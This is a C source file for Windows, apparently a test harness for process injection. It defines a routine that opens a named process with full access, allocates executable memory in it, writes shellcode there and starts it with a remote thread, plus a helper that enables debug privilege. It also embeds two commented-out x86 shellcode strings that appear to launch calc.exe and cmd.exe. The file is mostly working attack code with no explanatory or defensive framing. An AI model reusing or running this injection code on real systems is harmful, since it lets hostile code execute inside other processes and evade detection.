#include "utils.h"

#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WINVER _WIN32_WINNT_WIN10


#define RTN_OK 0
#define RTN_USAGE 1
#define RTN_ERROR 13

BOOL SetPrivilege(
    HANDLE hToken,          // token handle
    LPCTSTR Privilege,      // Privilege to enable/disable
    BOOL bEnablePrivilege   // TRUE to enable.  FALSE to disable
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    TOKEN_PRIVILEGES tpPrevious;
    DWORD cbPrevious = sizeof(TOKEN_PRIVILEGES);

    if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;

    // 
    // first pass.  get current privilege setting
    // 
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = 0;

    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        &tpPrevious,
        &cbPrevious
    );

    if (GetLastError() != ERROR_SUCCESS) return FALSE;

    // 
    // second pass.  set privilege based on previous setting
    // 
    tpPrevious.PrivilegeCount = 1;
    tpPrevious.Privileges[0].Luid = luid;

    if (bEnablePrivilege) {
        tpPrevious.Privileges[0].Attributes |= (SE_PRIVILEGE_ENABLED);
    }
    else {
        tpPrevious.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
            tpPrevious.Privileges[0].Attributes);
    }

    AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tpPrevious,
        cbPrevious,
        NULL,
        NULL
    );

    if (GetLastError() != ERROR_SUCCESS)
        return FALSE;

    return TRUE;
}
//
//BOOL SetPrivilege(
//    HANDLE hToken,  // token handle 
//    LPCTSTR Privilege,  // Privilege to enable/disable 
//    BOOL bEnablePrivilege  // TRUE to enable. FALSE to disable 
//)
//{
//    TOKEN_PRIVILEGES tp = { 0 };
//    // Initialize everything to zero 
//    LUID luid;
//    DWORD cb = sizeof(TOKEN_PRIVILEGES);
//    if (!LookupPrivilegeValue(NULL, Privilege, &luid))
//        return FALSE;
//    tp.PrivilegeCount = 1;
//    tp.Privileges[0].Luid = luid;
//    if (bEnablePrivilege) {
//        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//    }
//    else {
//        tp.Privileges[0].Attributes = 0;
//    }
//    AdjustTokenPrivileges(hToken, FALSE, &tp, cb, NULL, NULL);
//    if (GetLastError() != ERROR_SUCCESS)
//        return FALSE;
//
//    return TRUE;
//}

VOID InvokeRemoteShellCode(wchar_t processName[], char* shellCode) {
	//HANDLE pHandle = NtOpenProcess2(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, GetPidFromName(processName));
	HANDLE pHandle = NtOpenProcess2(PROCESS_ALL_ACCESS, GetPidFromName(processName));
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtAllocateVirtualMemory");
	_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtWriteVirtualMemory");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx");
	LPVOID address = NULL;
	SIZE_T bytesWritten = 0;
	NTSTATUS status = 0;
	SIZE_T size = strlen(shellCode) * sizeof(char) * 2;
	if (!(address = VirtualAllocEx(pHandle, address, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("Error in NtAllocateVirtualMemory, the status is: %x", GetLastError());
		return;
	}
	SIZE_T sz = (SIZE_T)strlen(shellCode);

	if (!(NT_SUCCESS(status = WriteProcessMemory(pHandle, address, (LPCVOID)shellCode, (SIZE_T)sz, &bytesWritten)))) {
		printf("Error in NtWriteVirtualMemory, the status is: %x.\nThe number of bytes have been written: %d", status, bytesWritten);
		return;
	}
	//NTSTATUS rs = NtCreateThreadEx(&tHandle, THREAD_ALL_ACCESS, NULL, pHandle, (LPTHREAD_START_ROUTINE)address, NULL, FALSE, 0, 0, 0, NULL);
	HANDLE tHandle = CreateRemoteThreadEx(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL, NULL);
	if (!tHandle) {
		printf("I failed creating the thread, the return status is %x\n", GetLastError());
		return;
	}
	WaitForSingleObject(tHandle, 30000);
}

int main() {
	//char* shellcode = "\x31\xC9\x64\x8B\x41\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x96\xAD\x8B\x58\x10\x8B\x53\x3C\x01\xDA\x8B\x52\x78\x01\xDA\x8B\x72\x20\x01\xDE\x31\xC9\x41\xAD\x01\xD8\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x8B\x72\x24\x01\xDE\x66\x8B\x0C\x4E\x49\x8B\x72\x1C\x01\xDE\x8B\x14\x8E\x01\xDA\x31\xC9\x53\x52\x51\x68\x78\x65\x63\x61\x83\x6C\x24\x03\x61\x68\x57\x69\x6E\x45\x54\x53\xFF\xD2\x83\xC4\x0C\x31\xC9\x51\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x6A\x05\x8D\x4C\x24\x04\x51\xFF\xD0\x83\xC4\x0C\x5A\x5D\xB9\x65\x73\x73\x61\x51\x83\x6C\x24\x03\x61\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\x53\xFF\xD2\x83\xC4\x14\x31\xC9\x51\xFF\xD0";
	/*char* shellcode =
		"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
		"\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
		"\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
		"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
		"\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
		"\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
		"\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
		"\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
		"\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
		"\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65"
		"\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
		"\x51\xff\xd6";
    */
	wchar_t wsInput[80];
	fgetws(wsInput, 80, stdin);
	wsInput[wcslen(wsInput) - 1] = L'\0';
    HANDLE pHandle = NtOpenProcess2(PROCESS_ALL_ACCESS, GetPidFromName(wsInput));
    printf("%x\n", pHandle);
    getchar();


    //if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken))
    //{
    //    if (GetLastError() == ERROR_NO_TOKEN)
    //    {
    //        if (!ImpersonateSelf(SecurityImpersonation))
    //            return RTN_ERROR;

    //        if (!OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hToken)) {
    //            printf("The error is: %x", GetLastError());
    //            return RTN_ERROR;
    //        }
    //    }
    //    else
    //        return RTN_ERROR;
    //}

    //// enable SeDebugPrivilege
    //if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE))
    //{
    //    printf("The error is: %x", GetLastError());

    //    // close token handle
    //    CloseHandle(hToken);

    //    // indicate failure
    //    return RTN_ERROR;
    //}

	//InvokeRemoteShellCode(wsInput, shellcode);

}

